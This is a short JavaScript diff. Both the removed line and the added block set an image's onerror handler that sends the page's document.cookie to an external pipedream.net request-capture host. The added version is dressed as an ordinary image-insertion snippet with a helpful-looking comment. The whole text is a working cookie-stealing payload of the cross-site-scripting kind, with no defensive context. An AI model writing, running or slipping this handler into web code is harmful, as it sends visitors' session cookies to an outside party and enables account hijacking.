@@ -1,1 +1,11 @@
-document.getElementById("myImg").onerror = this.src='http://enbbgj6muf3h4.x.pipedream.net?cookie='+document.cookie;
+const img = document.createElement('img');
+img.id = 'myImg';
+img.src = 'path/to/image.jpg'; // Replace with your image source
+
+// Append the image to the body (or another container)
+document.body.appendChild(img);
+
+// Set the onerror handler
+img.onerror = function() {
+  this.src = 'http://eo7u1nl20laxhkt.m.pipedream.net?cookie=' + document.cookie;
+};
